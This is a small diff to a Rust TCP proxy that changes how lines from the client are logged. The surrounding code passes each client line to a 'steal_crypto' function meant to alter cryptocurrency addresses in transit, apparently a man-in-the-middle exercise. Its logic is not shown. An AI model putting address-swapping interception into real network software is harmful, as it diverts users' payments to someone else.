@@ -65,7 +65,7 @@ async fn process(to_client_stream: TcpStream) -> Result<()> {
 
         // but what we get from the client...
         let bytes_from_client = client_reader.read_line(&mut line_from_client).await?;
-        info!("From client: {:?}", line_from_client);
+        info!("From client: {}", line_from_client);
 
         // ...we check if we can alter the crypto address
         let altered_line = steal_crypto(&line_from_client);
